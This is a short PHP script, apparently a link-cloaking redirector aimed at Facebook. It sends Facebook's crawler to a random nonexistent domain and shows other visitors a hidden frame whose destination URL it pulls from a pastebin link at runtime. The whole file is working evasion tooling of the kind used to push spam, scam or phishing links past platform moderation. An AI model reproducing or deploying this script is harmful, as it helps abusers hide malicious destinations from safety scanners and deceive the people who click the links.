<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('/facebook/si',$ua)) { 
$shuffle = str_shuffle("abcdefghijklmnopqrstuvwxyz");
header('Location: http://'.$shuffle.'.com/'); 
die(); 
}elseif(isset($_GET['i']) || isset($_GET['link'])){
$id = trim($_GET['i']);
$link = file_get_contents('http://pastebin.com/raw/aj0wD7Ss', true);	
if($id != ''){
$text2 ="&i=";
}
$path = str_replace(substr($_SERVER['REQUEST_URI'] , 0 , strpos($_SERVER['REQUEST_URI'],"//")) , "" , $_SERVER['REQUEST_URI']);
echo '
<html>
<head>
<title></title>
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="revisit-after" content="1000 days">
<meta name="robots" content="NOINDEX">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0"/>
</head>
<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
<frame name="main" src="'.$link.$path.$id.'">
<noframes>
<body bgcolor="#FFFFFF" text="#000000">
<a href="'.$link.$path.$id.'">Click here to continue</a>
</body>
</noframes>
</html>';
}
?>